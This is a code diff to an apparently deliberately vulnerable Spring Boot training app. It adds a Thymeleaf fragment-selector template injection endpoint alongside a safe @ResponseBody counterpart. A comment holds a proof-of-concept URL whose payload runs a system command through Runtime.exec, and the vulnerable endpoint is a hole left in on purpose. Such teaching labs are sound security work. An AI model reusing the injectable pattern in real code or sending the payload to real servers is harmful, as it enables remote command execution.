@@ -5,10 +5,7 @@ import io.swagger.annotations.ApiOperation;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 import org.springframework.stereotype.Controller;
-import org.springframework.web.bind.annotation.GetMapping;
-import org.springframework.web.bind.annotation.PathVariable;
-import org.springframework.web.bind.annotation.RequestMapping;
-import org.springframework.web.bind.annotation.RequestParam;
+import org.springframework.web.bind.annotation.*;
 
 import javax.servlet.http.HttpServletResponse;
 import java.util.ArrayList;
@@ -72,5 +69,23 @@ public class SSTI {
         log.info("[safe] SSTI payload: " + document);
     }
 
+    /**
+     * SpringBoot Thymeleaf 片段选择器注入
+     * @poc http://127.0.0.1:8888/vulnapi/SSTI/thymeleaf/fragment/vul?section=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22open%20-a%20Calculator%22).getInputStream()).next()%7d__::.x
+     */
+    @ApiOperation(value = "val：url作为片段选择器")
+    @GetMapping("/thymeleaf/fragment/vul")
+    public String fragmentVul(@RequestParam String section) {
+        return "lang/en :: " + section;
+    }
 
+    /**
+     * 设置 @ResponseBody 注解告诉 Spring 将返回值作为响应体处理，而不再是视图名称，因此无法进行模版注入攻击
+     */
+    @ApiOperation(value = "safe", notes = "由于设置 @ResponseBody 注解告诉 Spring 将返回值作为响应体处理，而不再是视图名称，因此无法进行模版注入攻击")
+    @GetMapping("/thymeleaf/fragment/safe")
+    @ResponseBody
+    public String fragmentSafe(@RequestParam String section) {
+        return "lang/en :: " + section;
+    }
 }
